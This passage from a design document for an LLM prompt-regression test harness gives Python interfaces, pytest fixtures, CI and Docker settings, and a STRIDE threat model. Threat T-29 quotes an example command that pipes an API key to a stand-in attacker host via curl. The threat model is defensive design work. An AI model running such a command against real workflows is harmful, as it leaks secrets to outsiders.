"""Baseline persistence port for storing and retrieving score baselines.

Located at: jerry/testing/baselines/ports.py
Implemented by: BaselineStore (jerry/testing/baselines/store.py)
"""

from typing import Optional, Protocol

from jerry.testing.types import BaselineRecord, VersionKey


class BaselinePersistencePort(Protocol):
    """Port for baseline score storage and retrieval.

    Baselines are indexed by VersionKey (commit hash + file path).
    """

    def store(self, record: BaselineRecord) -> None:
        """Persist a baseline record.

        Args:
            record: The baseline data to store.

        Raises:
            ValueError: If record.quality_gate_passed is False
                (prevents storing baselines from failed quality gates).
        """
        ...

    def retrieve(self, version_key: VersionKey) -> Optional[BaselineRecord]:
        """Retrieve a baseline record by version key.

        Args:
            version_key: The composite key to look up.

        Returns:
            The baseline record if found, None otherwise.
        """
        ...

    def get_latest(self, file_path: str) -> Optional[BaselineRecord]:
        """Retrieve the most recent baseline for a given agent file.

        Args:
            file_path: Repo-relative path to the agent definition file.

        Returns:
            The most recent baseline record for this file, or None.
        """
        ...
```

#### ReportOutput Port

```python
"""Report output port for emitting evaluation results.

Located at: jerry/testing/reports/ports.py
Implemented by: ReportGenerator (jerry/testing/reports/generator.py)
"""

from typing import Protocol

from jerry.testing.types import EvaluationReport


class ReportOutputPort(Protocol):
    """Port for generating and emitting evaluation reports.

    Supports multiple output formats (Markdown, JSON, PR comment).
    """

    def generate_markdown(self, report: EvaluationReport) -> str:
        """Generate a Markdown-formatted evaluation report.

        Args:
            report: The complete evaluation report.

        Returns:
            Markdown string suitable for PR comment or file output.
        """
        ...

    def generate_json(self, report: EvaluationReport) -> str:
        """Generate a JSON-formatted evaluation report.

        Args:
            report: The complete evaluation report.

        Returns:
            JSON string for programmatic consumption.
        """
        ...

    def emit_pr_comment(
        self,
        report: EvaluationReport,
        pr_number: int,
    ) -> None:
        """Post evaluation report as a PR comment via GitHub API.

        Args:
            report: The complete evaluation report.
            pr_number: GitHub pull request number.
        """
        ...
```

### 2.3 External Interfaces

#### GitHub Actions Workflow Inputs/Outputs

```yaml
# .github/workflows/prompt-regression-standard.yml
# External interface contract for the Standard tier workflow

name: Prompt Regression (Standard)

on:
  pull_request:
    paths:
      - 'skills/*/agents/*.md'  # Trigger on agent definition changes
    types: [opened, synchronize, reopened]

# INPUTS (via GitHub Actions context)
# github.event.pull_request.base.sha    -- Version A commit
# github.event.pull_request.head.sha    -- Version B commit
# github.event.pull_request.number      -- PR number for comment
# secrets.ANTHROPIC_API_KEY             -- LLM API key (REQUIRED)
# secrets.LANGFUSE_SECRET_KEY           -- Observability (OPTIONAL)

# OUTPUTS (via GitHub Actions artifacts and checks)
# Artifact: prompt-regression-report-{pr_number}.json
# Artifact: prompt-regression-report-{pr_number}.md
# Check: prompt-regression/standard (pass/fail/neutral)
# PR Comment: evaluation summary with verdict and CIs

permissions:
  contents: read           # Read repo contents
  pull-requests: write     # Post PR comment
  checks: write            # Create check run
  # NOTE: No write to contents; no admin; no packages
```

#### Docker Volume Mounts

```
docker run --rm \
  --read-only \                                    # Read-only filesystem
  --security-opt=no-new-privileges:true \          # No privilege escalation
  --cap-drop=ALL \                                 # Drop all capabilities
  -v $(pwd)/tests/prompt-regression:/app/tests:ro \  # Test configs (read-only)
  -v $(pwd)/skills:/app/skills:ro \                  # Agent definitions (read-only)
  -v /tmp/promptfoo-output:/app/output:rw \          # Output directory (write)
  -e ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY} \         # API key from env
  promptfoo-harness:latest \
  eval --config /app/tests/${AGENT_NAME}.yaml
```

#### pytest Fixtures

```python
"""pytest fixtures for prompt regression testing.

Located at: tests/prompt-regression/conftest.py
"""

import os

import pytest

from jerry.testing.types import EvaluationTier, VersionKey
from jerry.testing.evaluation.deepeval_adapter import DeepEvalAdapter
from jerry.testing.evaluation.debiasing import DebiasingStrategy
from jerry.testing.baselines.store import BaselineStore
from jerry.testing.reports.generator import ReportGenerator


@pytest.fixture
def evaluation_tier(request: pytest.FixtureRequest) -> EvaluationTier:
    """Determine evaluation tier from pytest marker or env var.

    Usage:
        @pytest.mark.tier("standard")
        def test_my_regression():
            ...

    Returns:
        The evaluation tier for this test session.
    """
    marker = request.node.get_closest_marker("tier")
    if marker:
        return EvaluationTier(marker.args[0])
    # Fall back to environment variable, then default to SMOKE
    tier_env = os.environ.get("PROMPT_REGRESSION_TIER", "smoke")
    return EvaluationTier(tier_env)


@pytest.fixture
def version_a_key(request: pytest.FixtureRequest) -> VersionKey:
    """Version key for the base branch (pre-change).

    Constructed from git base commit SHA and the agent file path
    under test. In CI, reads from GitHub Actions event context.
    Locally, reads from PROMPT_REGRESSION_BASE_SHA env var or
    falls back to current HEAD~1.

    Returns:
        VersionKey with base branch commit hash and agent file path.

    Raises:
        ValueError: If neither CI context nor env var provides a base SHA.
    """
    # Determine agent file path from test module or marker
    marker = request.node.get_closest_marker("agent_file")
    if marker:
        agent_file = marker.args[0]
    else:
        agent_file = os.environ.get(
            "PROMPT_REGRESSION_AGENT_FILE",
            "skills/problem-solving/agents/ps-researcher.md",
        )

    # Determine base commit SHA
    base_sha = os.environ.get("PROMPT_REGRESSION_BASE_SHA")
    if not base_sha:
        # In GitHub Actions, read from event context
        base_sha = os.environ.get("GITHUB_BASE_SHA")
    if not base_sha:
        raise ValueError(
            "Base SHA not available. Set PROMPT_REGRESSION_BASE_SHA or "
            "run within GitHub Actions PR context (GITHUB_BASE_SHA)."
        )

    return VersionKey(commit_hash=base_sha, file_path=agent_file)


@pytest.fixture
def version_b_key(request: pytest.FixtureRequest) -> VersionKey:
    """Version key for the PR branch (post-change).

    Constructed from git head commit SHA and the agent file path
    under test. In CI, reads from GitHub Actions event context.
    Locally, reads from PROMPT_REGRESSION_HEAD_SHA env var or
    falls back to current HEAD.

    Returns:
        VersionKey with PR branch commit hash and agent file path.

    Raises:
        ValueError: If neither CI context nor env var provides a head SHA.
    """
    # Determine agent file path from test module or marker
    marker = request.node.get_closest_marker("agent_file")
    if marker:
        agent_file = marker.args[0]
    else:
        agent_file = os.environ.get(
            "PROMPT_REGRESSION_AGENT_FILE",
            "skills/problem-solving/agents/ps-researcher.md",
        )

    # Determine head commit SHA
    head_sha = os.environ.get("PROMPT_REGRESSION_HEAD_SHA")
    if not head_sha:
        head_sha = os.environ.get("GITHUB_HEAD_SHA")
    if not head_sha:
        raise ValueError(
            "Head SHA not available. Set PROMPT_REGRESSION_HEAD_SHA or "
            "run within GitHub Actions PR context (GITHUB_HEAD_SHA)."
        )

    return VersionKey(commit_hash=head_sha, file_path=agent_file)


@pytest.fixture
def evaluator() -> DeepEvalAdapter:
    """Configured DeepEval evaluation adapter with debiasing enabled.

    Creates a DeepEvalAdapter with position randomization and rubric
    criterion shuffling enabled for LLM-as-Judge debiasing. The model
    is configured from the JERRY_JUDGE_MODEL env var (preferred),
    falling back to DEEPEVAL_MODEL (legacy), then the default Claude Sonnet.

    Environment variable precedence:
        1. JERRY_JUDGE_MODEL (EN-036-001 model flexibility)
        2. DEEPEVAL_MODEL (legacy compatibility)
        3. Default: claude-sonnet-4-20250514

    Returns:
        Configured DeepEvalAdapter ready for evaluation calls.
    """
    model_name = os.environ.get(
        "JERRY_JUDGE_MODEL",
        os.environ.get("DEEPEVAL_MODEL", "claude-sonnet-4-20250514"),
    )
    debiasing = DebiasingStrategy(
        position_randomization=True,
        rubric_shuffling=True,
    )
    return DeepEvalAdapter(
        model_name=model_name,
        debiasing_strategy=debiasing,
    )


@pytest.fixture
def baseline_store(tmp_path: str) -> BaselineStore:
    """Baseline store using temporary directory for test isolation.

    Uses pytest's tmp_path fixture to ensure each test session gets
    an isolated baseline directory that is cleaned up after the test.

    Args:
        tmp_path: pytest-provided temporary directory path.

    Returns:
        BaselineStore configured to use the temporary directory.
    """
    baselines_dir = os.path.join(str(tmp_path), "baselines")
    os.makedirs(baselines_dir, exist_ok=True)
    return BaselineStore(storage_dir=baselines_dir)


@pytest.fixture
def report_generator() -> ReportGenerator:
    """Report generator configured for test output.

    Creates a ReportGenerator that produces Markdown and JSON reports.
    In test context, PR comment emission is disabled (no GitHub API calls).

    Returns:
        Configured ReportGenerator with PR commenting disabled.
    """
    return ReportGenerator(
        enable_pr_comments=False,
        output_format="markdown",
    )
```

#### Model Parameterization (EN-036-001)

The test harness supports configurable model selection for both G-Eval judge scoring (Layer 2) and agent execution, enabling cross-model regression testing and cost-optimized evaluation tiers.

```
MODEL OVERRIDE HIERARCHY:
=========================

Judge Model (Layer 2 G-Eval scoring):
  1. --judge-model CLI flag (highest precedence)
  2. JERRY_JUDGE_MODEL environment variable
  3. DeepEvalAdapter constructor default: claude-sonnet-4-20250514

Agent Execution Model (Phase 1 output generation):
  1. --agent-model CLI flag (highest precedence)
  2. JERRY_AGENT_MODEL environment variable
  3. Agent definition frontmatter `model:` field (default)

Composite Model Version Tracking:
  Format: "{agent_model}:{judge_model}"
  Example: "claude-opus-4-20250514:claude-sonnet-4-20250514"
  Stored in: BaselineRecord.model_version
  Utilities: format_composite_model_version(), parse_composite_model_version()

Apples-to-Apples Guard (Layer 4):
  Layer4Pipeline._validate_model_versions() rejects comparison when
  baseline and candidate model versions differ. Skips validation
  when either is None (backwards compatible with pre-EN-036-001 baselines).

Model Pricing Table (types.py):
  MODEL_PRICING maps model prefixes to per-million-token costs.
  Longer prefixes listed first for correct matching precedence.
  Source: https://docs.anthropic.com/en/docs/about-claude/models

    claude-opus-4-6:   $5.00 input,  $25.00 output  (current)
    claude-opus-4-5:   $5.00 input,  $25.00 output
    claude-opus-4-1:  $15.00 input,  $75.00 output  (legacy)
    claude-opus-4:    $15.00 input,  $75.00 output  (legacy 4.0 catch-all)
    claude-sonnet-4:   $3.00 input,  $15.00 output  (all 4.x versions)
    claude-haiku-4:    $1.00 input,   $5.00 output

  lookup_model_pricing() uses case-insensitive prefix matching.
```

#### API Key Management

```
API KEY FLOW:
=============

1. Storage:
   GitHub Actions Secrets (encrypted at rest, scoped to repository)
   Repository Settings > Secrets and Variables > Actions
   - ANTHROPIC_API_KEY (required)
   - LANGFUSE_SECRET_KEY (optional)

2. Injection:
   workflow.yml env: section injects secrets as environment variables
   env:
     ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}

3. Propagation to Docker:
   Docker -e flag passes env var into container
   -e ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}

4. Consumption:
   Python code reads from environment:
   os.environ["ANTHROPIC_API_KEY"]

5. Protection:
   - Never logged (GHA auto-masks secrets in logs)
   - Never in YAML test files
   - Never in git history
   - Never in Docker image layers
   - Container runs with --read-only filesystem
```

### 2.4 Shared Module Interface (stats.py)

The `jerry/testing/stats.py` module is shared between PROJ-035 (prompt regression) and PROJ-017 (skill evaluation). This interface must satisfy both consumers.

```python
"""Statistical engine for LLM evaluation comparison.

This module is shared between:
- PROJ-035: Prompt regression detection (Wilcoxon + Wilson)
- PROJ-017: Skill effectiveness evaluation (BCa bootstrap + permutation)

Domain isolation (H-07): This module imports ONLY from:
- jerry.testing.types (shared domain types)
- scipy.stats (external math library)
- statsmodels.stats.proportion (external stats library)
- Python stdlib (math, typing, dataclasses)

This module MUST NOT import from:
- jerry.testing.evaluation (Layer 2 adapter)
- jerry.testing.metamorphic (Layer 3 domain)
- jerry.testing.baselines (baseline adapter)
- jerry.testing.reports (report adapter)
- DeepEval, promptfoo, or any testing framework
"""

from jerry.testing.types import (
    ConfidenceInterval,
    RegressionResult,
    ScoreArray,
    TestVerdict,
    WilcoxonResult,
)


def compare_versions(
    scores_a: ScoreArray,
    scores_b: ScoreArray,
    alpha: float = 0.05,
    n_metrics: int = 1,
    quality_threshold: float = 0.92,
) -> RegressionResult:
    """Compare two prompt versions using Wilcoxon signed-rank test.

    Primary PROJ-035 entry point. Determines whether version B
    represents a statistically significant regression from version A.

    Args:
        scores_a: Score array from prompt version A (baseline).
        scores_b: Score array from prompt version B (candidate).
        alpha: Significance level before Bonferroni correction.
        n_metrics: Total number of metrics for Bonferroni correction.
        quality_threshold: Score threshold for Wilson CI pass rate.

    Returns:
        RegressionResult with verdict, p-value, and confidence intervals.

    Raises:
        InsufficientSamplesError: If either array has N < 20.
        InvalidScoreArrayError: If scores contain invalid values.
    """
    ...


def wilcoxon_test(
    scores_a: tuple[float, ...],
    scores_b: tuple[float, ...],
    alpha: float = 0.05,
    n_metrics: int = 1,
) -> WilcoxonResult:
    """Perform Wilcoxon signed-rank test with Bonferroni correction.

    Low-level test function used by compare_versions.

    Args:
        scores_a: Raw score values for version A.
        scores_b: Raw score values for version B.
        alpha: Base significance level.
        n_metrics: Number of metrics for Bonferroni correction.

    Returns:
        WilcoxonResult with test statistic, p-value, corrected alpha.

    Raises:
        InsufficientSamplesError: If N < 20 for either array.
    """
    ...


def wilson_confidence_interval(
    scores: tuple[float, ...],
    threshold: float = 0.92,
    confidence: float = 0.95,
) -> ConfidenceInterval:
    """Compute Wilson score confidence interval for pass rate.

    Pass rate is defined as the proportion of scores >= threshold.

    Args:
        scores: Score values to analyze.
        threshold: Quality threshold for pass/fail classification.
        confidence: Confidence level for the interval (default 95%).

    Returns:
        ConfidenceInterval with lower, upper, and point estimate.
    """
    ...


def bonferroni_correct(
    alpha: float,
    n_comparisons: int,
) -> float:
    """Apply Bonferroni correction for multiple comparisons.

    The k=13 correction applies to the full evaluation suite
    (see contracts/behavioral-contracts.md Section D.3). Reduced k
    values apply in specific modes: k=10 for benchmark runs (NFR-003),
    k=5 for simplified statistical runs (NFR-007).

    Args:
        alpha: Uncorrected significance level.
        n_comparisons: Number of simultaneous comparisons.

    Returns:
        Corrected alpha value (alpha / n_comparisons).

    Raises:
        ValueError: If n_comparisons < 1.
    """
    ...


# === PROJ-017 entry points (BCa bootstrap) ===
# These functions serve PROJ-017's skill effectiveness evaluation.
# They operate on the same ScoreArray type but use different
# statistical methods (BCa bootstrap, permutation test).

def bca_bootstrap_ci(
    scores: tuple[float, ...],
    n_bootstrap: int = 10_000,
    confidence: float = 0.95,
) -> ConfidenceInterval:
    """Compute BCa bootstrap confidence interval for mean score.

    Primary PROJ-017 entry point for uncertainty quantification.

    Args:
        scores: Score values to bootstrap.
        n_bootstrap: Number of bootstrap resamples.
        confidence: Confidence level (default 95%).

    Returns:
        ConfidenceInterval with bias-corrected, accelerated bounds.
    """
    ...


def permutation_test(
    scores_treatment: tuple[float, ...],
    scores_control: tuple[float, ...],
    n_permutations: int = 10_000,
    alternative: str = "two-sided",
) -> float:
    """Permutation test for difference in means.

    PROJ-017 entry point for skill vs. no-skill comparison.

    Args:
        scores_treatment: Scores with skill activated.
        scores_control: Scores without skill.
        n_permutations: Number of permutation resamples.
        alternative: "two-sided", "greater", or "less".

    Returns:
        p-value for the observed difference.
    """
    ...


class InsufficientSamplesError(ValueError):
    """Raised when sample size is below minimum for statistical test.

    Enforces N >= 20 for Wilcoxon signed-rank test (PROJ-035)
    and N >= 30 for BCa bootstrap (PROJ-017).
    """

    def __init__(self, required: int, actual: int, test_name: str) -> None:
        super().__init__(
            f"{test_name} requires N >= {required}, got N = {actual}. "
            f"Use Smoke mode for single-run structural checks only."
        )
        self.required = required
        self.actual = actual
        self.test_name = test_name


class InvalidScoreArrayError(ValueError):
    """Raised when score array contains invalid values.

    Detects: out-of-range scores, all-constant arrays (zero variance),
    NaN or infinity values.
    """

    pass
```

---

## Part 3: STRIDE Threat Model

### 3.0 Trust Boundary Map

```
TRUST BOUNDARIES
================

    TB-1: Repository Boundary
    +----------------------------------------------------------+
    |  YAML test cases, agent definitions, baseline data,      |
    |  workflow configs, Docker configs                        |
    |                                                          |
    |    TB-2: Docker Container Boundary                       |
    |    +--------------------------------------------------+  |
    |    |  promptfoo runtime, Node.js, test execution      |  |
    |    |  Isolated from host; read-only mounts            |  |
    |    +--------------------------------------------------+  |
    |                                                          |
    |    TB-3: GitHub Actions Boundary                         |
    |    +--------------------------------------------------+  |
    |    |  Workflow execution, secrets, artifact storage    |  |
    |    |  Managed by GitHub; ephemeral runners             |  |
    |    +--------------------------------------------------+  |
    |                                                          |
    +----------------------------------------------------------+

    TB-4: External API Boundary
    +----------------------------------------------------------+
    |  Anthropic Claude API                                    |
    |  Receives prompts; returns completions                   |
    |  Authenticates via API key                               |
    +----------------------------------------------------------+

    TB-5: External Package Boundary
    +----------------------------------------------------------+
    |  PyPI packages (DeepEval, scipy, statsmodels)            |
    |  npm packages (promptfoo, inside Docker)                 |
    |  Docker Hub base images                                  |
    +----------------------------------------------------------+
```

### 3.1 Attack Surface 1: YAML Test Case Files

Data flow: Developer writes YAML -> promptfoo loads YAML -> promptfoo sends prompt to LLM.

| Threat ID | STRIDE | Threat Description | Likelihood | Impact | Risk | Mitigation Control |
|-----------|--------|--------------------|------------|--------|------|-------------------|
| T-01 | **S** Spoofing | Attacker commits YAML test cases impersonating a different agent, causing regression results to be attributed to the wrong agent | L | M | Low | MC-01: YAML schema validation requires `description` field matching filename pattern; PR review gate |
| T-02 | **T** Tampering | Attacker injects prompt injection payload into YAML `vars.user_query` field, causing the LLM to produce manipulated outputs that bias scores | H | H | **High** | MC-02: Input sanitization layer strips known injection patterns; test input length limits enforced; LLM outputs independently scored |
| T-03 | **T** Tampering | Attacker modifies `assert.threshold` values in YAML to lower the regression detection sensitivity, allowing regressions to pass | M (any PR contributor can edit YAML test files; threshold changes are subtle and easy to overlook in review) | H | **High** | MC-03: YAML test files validated against locked schema; threshold values enforced by schema `minimum` constraints; PR review required |
| T-04 | **R** Repudiation | Developer modifies test cases without audit trail, claims test failures were pre-existing | L | M | Low | MC-04: All YAML changes tracked in git history; PR-based workflow provides commit attribution |
| T-05 | **I** Info Disclosure | YAML test case `vars` fields contain sensitive data (PII, internal system details) that leak into LLM API calls | M (developers may copy real user queries into test vars for realism; no automated PII detection in YAML before pre-commit hook is installed) | M | Medium | MC-05: YAML schema enforces `vars` field type constraints; pre-commit hook scans for sensitive patterns; test inputs use synthetic data only |
| T-06 | **D** DoS | Attacker creates thousands of YAML test cases or test cases with extremely large input payloads, exhausting CI/CD resources | M (no structural limit exists until MC-06 is implemented; a single PR can add arbitrary YAML files to the test directory) | M | Medium | MC-06: Maximum test case count per YAML file enforced (100); input payload size limit (10KB per var); workflow timeout limits |
| T-07 | **E** Elevation | Attacker crafts YAML test case that exploits promptfoo's `file://` protocol handler to read arbitrary files from the Docker container | H | H | **High** | MC-07: Docker container runs with read-only filesystem and dropped capabilities; `file://` paths restricted to whitelisted directories via promptfoo config; no host filesystem access |

### 3.2 Attack Surface 2: promptfoo Docker Container

Data flow: GitHub Actions launches Docker -> Docker runs promptfoo -> promptfoo calls LLM API.

| Threat ID | STRIDE | Threat Description | Likelihood | Impact | Risk | Mitigation Control |
|-----------|--------|--------------------|------------|--------|------|-------------------|
| T-08 | **S** Spoofing | Malicious Docker image substituted for legitimate promptfoo image via tag poisoning or registry compromise | L | H | Medium | MC-08: Pin Docker image to specific digest (SHA256); build from source Dockerfile; do not use `:latest` tag |
| T-09 | **T** Tampering | promptfoo container writes malicious files to mounted output volume that are later consumed by downstream pipeline stages | M (requires a compromised or malicious promptfoo npm dependency; the output volume is the only writable surface) | H | **High** | MC-09: Output volume is the only writable mount; output files are validated (JSON schema check) before consumption; output directory is isolated from source |
| T-10 | **T** Tampering | Container modifies promptfoo configuration at runtime to change evaluation behavior (e.g., disable debiasing, change model) | L | H | Medium | MC-10: All config files mounted read-only (`ro` flag); container filesystem is read-only (`--read-only`) |
| T-11 | **R** Repudiation | Container execution leaves no audit trail; evaluation results cannot be traced to specific container invocation | L | M | Low | MC-11: Container logs captured by GitHub Actions; run ID and container digest logged in evaluation report |
| T-12 | **I** Info Disclosure | API key injected via environment variable is readable inside the container by any process | M (environment variables are visible to all processes in the container namespace; a compromised npm dependency could read process environment) | M | Medium | MC-12: Container runs single process; no shell access; no SSH; `--cap-drop=ALL` prevents capability escalation; API key passed via env (not file mount) to avoid persistence |
| T-13 | **D** DoS | Container consumes excessive CPU/memory, starving the GitHub Actions runner | M (promptfoo evaluation runs are compute-intensive by design; without explicit resource limits a single run can monopolize the runner) | M | Medium | MC-13: Docker `--memory` and `--cpus` limits enforced; GitHub Actions workflow `timeout-minutes` set |
| T-14 | **E** Elevation | Container escapes to host via kernel vulnerability or misconfigured security context | L | H | Medium | MC-14: `--security-opt=no-new-privileges:true`; `--cap-drop=ALL`; non-root user inside container; GitHub Actions runners are ephemeral (destroyed after use) |

### 3.3 Attack Surface 3: LLM API Integration

Data flow: Python code calls Anthropic API -> API returns completion -> score computed.

| Threat ID | STRIDE | Threat Description | Likelihood | Impact | Risk | Mitigation Control |
|-----------|--------|--------------------|------------|--------|------|-------------------|
| T-15 | **S** Spoofing | Man-in-the-middle intercepts API calls and returns fabricated completions that produce favorable scores | L | H | Medium | MC-15: Anthropic API uses HTTPS/TLS by default; certificate pinning via SDK; no HTTP fallback |
| T-16 | **T** Tampering | API response is modified in transit, altering completion content and thus evaluation scores | L | H | Medium | MC-16: TLS integrity protection; response hash verification optional for Full tier |
| T-17 | **R** Repudiation | LLM responses are ephemeral; no proof that a specific model produced a specific output at a specific time | M (LLM API responses are not persisted by default; without MC-17 logging, evaluation verdicts become unverifiable post-hoc) | M | Medium | MC-17: All LLM responses logged with request ID, model version, timestamp; stored as evaluation artifacts |
| T-18 | **I** Info Disclosure | Prompt content (agent definitions, test inputs) sent to Anthropic API is logged or retained by the provider | M (all evaluation runs transmit full agent definition content and test inputs to the API; provider retention policies may change) | M | Medium | MC-18: Anthropic API data retention policy reviewed; no customer data used for training (per Anthropic policy); agent definitions are not trade secrets (open source repo) |
| T-19 | **D** DoS | LLM API rate limiting or outage prevents evaluation completion, blocking PR merges. Likelihood rationale: High because Anthropic API rate limits are regularly encountered during burst evaluation runs (N=30 x 5 agents = 150 sequential API calls), and API outages are outside our control | H | M | **High** | MC-19: Exponential backoff with jitter on 429 responses; configurable retry count (default 3); graceful degradation to Smoke tier on persistent failure; timeout per API call (120s) |
| T-20 | **D** DoS | Cost explosion from excessive LLM API calls; Full tier with 30 runs x 5 agents x 6 criteria = 900 API calls per evaluation. Likelihood rationale: High because the multiplicative cost structure means any misconfiguration (wrong tier, wrong N, unbounded retry) compounds rapidly; no built-in ceiling without MC-20 | H | H | **High** | MC-20: Cost monitoring composite action tracks token count; per-workflow budget ceiling ($20 for Full, $5 for Standard); alert on threshold breach; automatic termination on budget exceeded |
| T-21 | **E** Elevation | Prompt injection in LLM response causes downstream code execution when response is `eval()`'d or used unsafely | L | H | Medium | MC-21: LLM responses treated as untrusted strings; no `eval()`, `exec()`, or dynamic code execution on response content; responses parsed as text only |

### 3.4 Attack Surface 4: Baseline Data Store

Data flow: Statistical engine writes baselines -> Store persists to disk -> Future runs read baselines for comparison.

| Threat ID | STRIDE | Threat Description | Likelihood | Impact | Risk | Mitigation Control |
|-----------|--------|--------------------|------------|--------|------|-------------------|
| T-22 | **S** Spoofing | Attacker creates fake baseline records with artificially high scores, making regressions undetectable (all comparisons show improvement). Likelihood rationale: Medium because baseline creation requires PR approval, but a compromised reviewer or social engineering of approval could bypass this; the impact is high because inflated baselines silently mask all subsequent regressions | M | H | **High** | MC-22: Baseline records require `quality_gate_passed: true`; baseline store validates VersionKey against git history (commit must exist); baseline acceptance requires quality gate check |
| T-23 | **T** Tampering | Attacker modifies existing baseline JSON files to inflate historical scores, hiding regressions | M (baseline files are plain JSON in the repository; any contributor with write access can modify them in a PR, and subtle score inflation may pass cursory review) | H | **High** | MC-23: Baseline files are git-tracked; modifications require PR review; baseline audit CLI command detects score anomalies (sudden jumps > 2 sigma) |
| T-24 | **R** Repudiation | Baseline scores lack provenance; cannot prove which evaluation run and configuration produced them | L | M | Low | MC-24: BaselineRecord includes `captured_at` timestamp, `version_key` (commit hash), `tier`, and `quality_gate_passed`; all fields are immutable (frozen dataclass) |
| T-25 | **I** Info Disclosure | Baseline JSON files inadvertently contain API keys, prompt content, or LLM responses that are committed to the repository. Likelihood rationale: Medium because the BaselineRecord schema design excludes prompt content, but developer error during implementation could add logging or debugging fields that persist sensitive data; the impact is High because committed secrets require key rotation and git history rewriting | M | H | **High** | MC-25: BaselineRecord schema contains only numerical scores and metadata; no prompt content or LLM responses stored in baselines; `.gitignore` excludes temporary evaluation artifacts; pre-commit hook validates baseline file schema |
| T-26 | **D** DoS | Baseline store grows unboundedly as new baselines accumulate for every commit, exhausting disk space | L | L | Low | MC-26: Retention policy: keep only N most recent baselines per agent (default 10); prune on baseline write; baseline files are small (~1KB each) |
| T-27 | **E** Elevation | Baseline store path traversal: crafted `file_path` in VersionKey escapes the baseline directory to read/write arbitrary files | M (VersionKey file_path is constructed from user-influenced input such as git diff output; without validation, path traversal sequences can escape the baselines directory) | H | **High** | MC-27: VersionKey `file_path` validated against whitelist of repo-relative patterns (`skills/*/agents/*.md`); path traversal characters (`..`, absolute paths) rejected; store operations confined to `baselines/` directory |

### 3.5 Attack Surface 5: GitHub Actions Workflow

Data flow: PR event triggers workflow -> Workflow reads secrets -> Workflow launches Docker and pytest -> Workflow posts results.

| Threat ID | STRIDE | Threat Description | Likelihood | Impact | Risk | Mitigation Control |
|-----------|--------|--------------------|------------|--------|------|-------------------|
| T-28 | **S** Spoofing | Forked repository PR triggers workflow and gains access to repository secrets. Likelihood rationale: Medium because GitHub's default behavior exposes `pull_request_target` secrets to forks, and developers may misconfigure the workflow to use `pull_request_target` instead of the safer `pull_request` event type | M | H | **High** | MC-28: Workflow uses `pull_request` event (not `pull_request_target`); forked PRs do not have access to repository secrets by default; fork PRs run Smoke tier only (no API key needed for structural checks) |
| T-29 | **T** Tampering | Attacker modifies workflow YAML in PR to exfiltrate secrets (e.g., `echo $ANTHROPIC_API_KEY | curl attacker.com`). Likelihood rationale: High because any PR contributor can modify workflow files, and the modification runs on the PR branch with access to secrets unless explicitly prevented; this is a well-documented GitHub Actions attack vector | H | H | **High** | MC-29: Workflow changes require CODEOWNERS approval; branch protection rules require review for `.github/workflows/` changes; secrets access logged by GitHub |
| T-30 | **R** Repudiation | Workflow execution deleted from GitHub Actions history, removing evidence of evaluation results | L | M | Low | MC-30: Evaluation reports stored as PR comments (persistent) and GitHub Actions artifacts (90-day retention); key results in PR description |
| T-31 | **I** Info Disclosure | Workflow logs expose API keys, evaluation scores, or prompt content in plain text | M (GitHub Actions logs are verbose by default; custom steps may inadvertently echo environment variables or debug output containing secrets) | H | **High** | MC-31: GitHub auto-masks registered secrets in logs; workflow uses `::add-mask::` for dynamic secrets; evaluation outputs sanitized before logging; no `echo $SECRET` in workflow |
| T-32 | **D** DoS | Attacker opens many PRs simultaneously to exhaust GitHub Actions minutes and API budget | M (any GitHub user can open PRs against a public repository; each PR triggers a workflow run consuming API budget and runner minutes) | M | Medium | MC-32: Concurrency control (`concurrency:` key) limits parallel workflow runs per PR; one active evaluation per PR (cancel-in-progress); API budget ceiling per workflow run |
| T-33 | **E** Elevation | Workflow uses `write` permissions unnecessarily, enabling lateral movement if workflow is compromised | M (GitHub Actions workflows default to broad permissions unless explicitly restricted; developers frequently copy workflow templates without narrowing the permissions block) | H | **High** | MC-33: Minimal permissions per workflow: `contents: read`, `pull-requests: write`, `checks: write`; no `admin`, `packages`, or `security-events` permissions |

### 3.6 Attack Surface 6: Statistical Comparison Engine

Data flow: Score arrays from Layer 2/3 -> Statistical functions -> Verdict.

| Threat ID | STRIDE | Threat Description | Likelihood | Impact | Risk | Mitigation Control |
|-----------|--------|--------------------|------------|--------|------|-------------------|
| T-34 | **S** Spoofing | Attacker provides fabricated score arrays that did not come from actual LLM evaluation, defeating the statistical comparison. Likelihood rationale: Medium because score arrays are constructed programmatically from LLM evaluation results, but a compromised evaluation adapter or modified test infrastructure could inject synthetic scores | M | H | **High** | MC-34: Score arrays include VersionKey traceability; scores validated against evaluation log (request IDs); statistical engine does not accept raw float arrays without provenance |
| T-35 | **T** Tampering | Adversarially crafted score sequences designed to defeat Wilcoxon test: e.g., all-constant arrays (zero variance) produce p=1.0 regardless of real difference; paired arrays where differences cancel out. Likelihood rationale: High because a malicious contributor with knowledge of the statistical methodology could construct inputs that produce p=1.0 (no significance) by ensuring paired differences sum to zero, and this requires only understanding the Wilcoxon test mechanics | H | H | **High** | MC-35: Input validation rejects: (a) constant arrays (all values identical), (b) arrays with zero IQR, (c) arrays where all paired differences are zero; minimum variance threshold enforced; warning emitted for suspiciously low variance |
| T-36 | **T** Tampering | Bonferroni correction manipulated by inflating `n_metrics` count, making the corrected alpha so small that no regression is ever detected | M (n_metrics is a configuration parameter that could be modified in the evaluation config or passed programmatically; without validation, any integer value is accepted) | H | **High** | MC-36: `n_metrics` parameter derived from evaluation config (not user input); validated against actual number of metrics executed; maximum cap (n_metrics <= 20); discrepancy between declared and actual metrics raises error |
| T-37 | **R** Repudiation | Statistical comparison results lack audit trail: the specific inputs (score arrays), parameters (alpha, n_metrics), and intermediate values (test statistic, p-value) that produced a verdict are not persisted, making it impossible to verify or reproduce a past decision. An attacker or faulty process could claim a PASS verdict was issued when it was not, or dispute a FAIL verdict without evidence | M (statistical computations are ephemeral by default; without explicit logging, intermediate values exist only in memory during execution) | M | Medium | MC-37: Every `compare_versions` invocation logs its full input parameters (score array lengths, alpha, n_metrics, quality_threshold), intermediate results (W statistic, raw p-value, corrected alpha), and final verdict to the evaluation report artifact. The `RegressionResult` dataclass captures all decision-relevant values. Report artifacts are persisted as GitHub Actions artifacts (90-day retention) and as PR comments (permanent). |
